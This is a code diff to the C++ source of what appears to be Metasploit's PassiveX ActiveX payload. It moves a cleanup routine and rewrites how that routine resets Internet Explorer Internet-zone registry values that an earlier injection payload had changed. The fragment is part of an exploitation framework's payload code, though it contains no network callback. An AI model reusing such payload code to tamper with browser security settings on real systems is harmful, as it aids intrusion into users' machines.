@@ -1,8 +1,3 @@
-/*
- *  This file is part of the Metasploit Exploit Framework
- *  and is subject to the same licenses and copyrights as
- *  the rest of this package.
- */
 #include "PassiveXLib.h"
 #include "CPassiveX.h"
 
@@ -13,8 +8,6 @@ static FILE *DebugFd = NULL;
 CPassiveX::CPassiveX()
 : PropHttpPort(0)
 {
-	// Reset zone restrictions back to default
-	ResetExplorerZoneRestrictions();
 }
 
 CPassiveX::~CPassiveX()
@@ -163,6 +156,9 @@ VOID CPassiveX::Initialize()
 				OLE2A(PropHttpHost),
 				(USHORT)PropHttpPort);
 	}
+	
+	// Reset zone restrictions back to default
+	ResetExplorerZoneRestrictions();
 }
 
 /*
@@ -171,7 +167,7 @@ VOID CPassiveX::Initialize()
  */
 VOID CPassiveX::ResetExplorerZoneRestrictions()
 {
-	ULONG Disabled = 1;
+	ULONG Value;
 	HKEY  InternetZoneKey = NULL;
 
 	// Open the internet zone
@@ -182,27 +178,48 @@ VOID CPassiveX::ResetExplorerZoneRestrictions()
 			KEY_WRITE,
 			&InternetZoneKey) == ERROR_SUCCESS)
 	{
-		// Set the values that were modified by the injection payload back to
-		// defaults
-
 		// Download unsigned ActiveX controls
+		Value = 3; // Disabled
+
 		RegSetValueEx(
 				InternetZoneKey,
 				TEXT("1004"), 
 				0,
 				REG_DWORD,
-				(LPBYTE)&Disabled,
-				sizeof(Disabled));
+				(LPBYTE)&Value,
+				sizeof(Value));
 
-		// Initialize and script ActiveX controls not marked as safe
+		RegSetValueEx(
+				InternetZoneKey,
+				TEXT("1201"), 
+				0,
+				REG_DWORD,
+				(LPBYTE)&Value,
+				sizeof(Value));
+
+		// Download signed ActiveX controls
+		Value = 1; // Prompt
+
+		RegSetValueEx(
+				InternetZoneKey,
+				TEXT("1001"), 
+				0,
+				REG_DWORD,
+				(LPBYTE)&Value,
+				sizeof(Value));
+
+		// Run ActiveX controls and plugins
+		Value = 0; // Enabled
+
 		RegSetValueEx(
 				InternetZoneKey,
 				TEXT("1200"), 
 				0,
 				REG_DWORD,
-				(LPBYTE)&Disabled,
-				sizeof(Disabled));
+				(LPBYTE)&Value,
+				sizeof(Value));
 	
+		// Initialize and script ActiveX controls not marked as safe
 		RegCloseKey(
 				InternetZoneKey);
 	}
